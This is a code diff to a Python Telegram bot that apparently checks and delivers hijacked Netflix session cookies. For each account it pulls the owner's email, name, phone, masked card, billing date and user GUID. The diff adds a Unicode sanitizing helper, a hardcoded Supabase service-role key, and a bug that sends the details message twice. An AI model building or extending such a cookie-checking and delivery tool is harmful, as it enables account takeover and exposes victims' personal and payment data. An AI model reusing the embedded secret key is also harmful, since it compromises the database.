@@ -14,6 +14,15 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 from concurrent.futures import ThreadPoolExecutor
 executor = ThreadPoolExecutor(max_workers=10)
 
+def sanitize(text):
+    """Remove invalid Unicode surrogates that break UTF-8 encoding."""
+    if not isinstance(text, str):
+        text = str(text) if text is not None else ""
+    # Remove lone surrogates (U+D800–U+DFFF)
+    text = re.sub(r'[\ud800-\udfff]', '�', text)
+    # Force clean UTF-8
+    return text.encode('utf-8', errors='replace').decode('utf-8')
+
 # ====================== CONFIG ======================
 SUPABASE_URL = "https://omzmzjptwjqxvjfxtcaf.supabase.co"
 SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tem16anB0d2pxeHZqZnh0Y2FmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3Mzg2ODg4MywiZXhwIjoyMDg5NDQ0ODgzfQ.q5WmCZynlkQQMV1WnXoiVfS5xJM0B2e8_JQUVrRQHdQ"
@@ -1164,26 +1173,27 @@ def handle_callback(call):
                 return
 
             # All field pulling (email, name_acc, days_left, language, nf_token, etc.)
-            email          = account_info.get("email") or "N/A"
-            name_acc       = account_info.get("accountOwnerName") or "N/A"
-            country_real   = account_info.get("countryOfSignup") or country_db or "N/A"
-            plan_real      = account_info.get("localizedPlanName") or f"Netflix {tier.capitalize()}"
-            profiles       = account_info.get("profilesDisplay") or account_info.get("profileCount") or "N/A"
-            quality        = account_info.get("videoQuality") or "N/A"
+            email          = sanitize(account_info.get("email") or "N/A")
+            name_acc       = sanitize(account_info.get("accountOwnerName") or "N/A")
+            country_real   = sanitize(account_info.get("countryOfSignup") or country_db or "N/A")
+            plan_real      = sanitize(account_info.get("localizedPlanName") or f"Netflix {tier.capitalize()}")
+            profiles       = sanitize(account_info.get("profilesDisplay") or account_info.get("profileCount") or "N/A")
+            quality        = sanitize(account_info.get("videoQuality") or "N/A")
             streams_raw    = account_info.get("maxStreams") or "N/A"
-            streams        = str(streams_raw).rstrip("}") if streams_raw != "N/A" else "N/A"
-            next_bill      = account_info.get("nextBillingDate") or "N/A"
-            payment        = account_info.get("paymentMethodType") or "N/A"
-            member_since   = account_info.get("memberSince") or "N/A"
-            profiles       = account_info.get("profilesDisplay") or "N/A"
-            masked_card    = account_info.get("maskedCard") or "N/A"
-            extra_member   = account_info.get("showExtraMemberSection") or "N/A"
-            plan_price     = account_info.get("planPrice") or "N/A"
-            phone          = account_info.get("phoneDisplay") or "N/A"
-            email_verified = account_info.get("emailVerified") or "N/A"
-            hold_status    = account_info.get("holdStatus") or "N/A"
-            profile_count  = account_info.get("profileCount") or ""
-            user_guid      = account_info.get("userGuid") or "N/A"
+            streams        = sanitize(str(streams_raw).rstrip("}") if streams_raw != "N/A" else "N/A")
+            next_bill      = sanitize(account_info.get("nextBillingDate") or "N/A")
+            payment        = sanitize(account_info.get("paymentMethodType") or "N/A")
+            member_since   = sanitize(account_info.get("memberSince") or "N/A")
+            masked_card    = sanitize(account_info.get("maskedCard") or "N/A")
+            extra_member   = sanitize(account_info.get("showExtraMemberSection") or "N/A")
+            plan_price     = sanitize(account_info.get("planPrice") or "N/A")
+            phone          = sanitize(account_info.get("phoneDisplay") or "N/A")
+            email_verified = sanitize(account_info.get("emailVerified") or "N/A")
+            hold_status    = sanitize(account_info.get("holdStatus") or "N/A")
+            profile_count  = sanitize(account_info.get("profileCount") or "")
+            user_guid      = sanitize(account_info.get("userGuid") or "N/A")
+
+            cookie_content = sanitize(cookie_row["key_id"])   # ← also sanitize the cookie
 
             member_since_display = member_since
             try:
@@ -1191,6 +1201,8 @@ def handle_callback(call):
                 member_since_display = fmt_ms(member_since) if member_since != "N/A" else "N/A"
             except:
                 pass
+
+            member_since_display = sanitize(member_since_display)
 
             days_left = "N/A"
             try:
@@ -1201,7 +1213,7 @@ def handle_callback(call):
             except:
                 pass
 
-            language = account_info.get("language") or account_info.get("preferredLanguage") or "N/A"
+            language = sanitize(account_info.get("language") or account_info.get("preferredLanguage") or "N/A")
 
             nf_token_data, error = nftoken_future.result()
             nf_token = nf_token_data.get("token") if nf_token_data else None
@@ -1213,7 +1225,7 @@ def handle_callback(call):
             plan_display = f"{plan_real} [{quality}] [Streams: {streams}]" if streams != "N/A" else plan_real
             profile_label = f"PROFILES ({profile_count})" if profile_count else "PROFILES"
             extra_display = "Yes" if str(extra_member).lower() not in ("n/a", "false", "none", "", "no") else "No"
-            db_filename = f"[{tier.capitalize()}] [1 payments] [extra {extra_display}] [{country_real}] [{email}] [Tested By caydigitals].txt"
+            db_filename = sanitize(f"[{tier.capitalize()}] [1 payments] [extra {extra_display}] [{country_real}] [{email}] [Tested By caydigitals].txt")
 
             # Step 4: Show #NETFLIX ACCOUNT DETAILS header
             header_text = (
@@ -1246,6 +1258,11 @@ def handle_callback(call):
                 f"</pre>"
             )
             bot.send_message(chat_id, header_text, parse_mode="HTML")
+            try:
+                bot.send_message(chat_id, header_text, parse_mode="HTML")
+            except Exception as e:
+                print(f"[Send Error] {e}")
+                bot.send_message(chat_id, "✅ Cookie delivered, but there was an issue showing the full details.", parse_mode="HTML")
 
             # Step 5: Long animation
             checking_msg = bot.send_message(chat_id, f"🔍 <b>Checking Cookie:</b> <code>[Parsing Cookie]</code> ⏳", parse_mode="HTML")
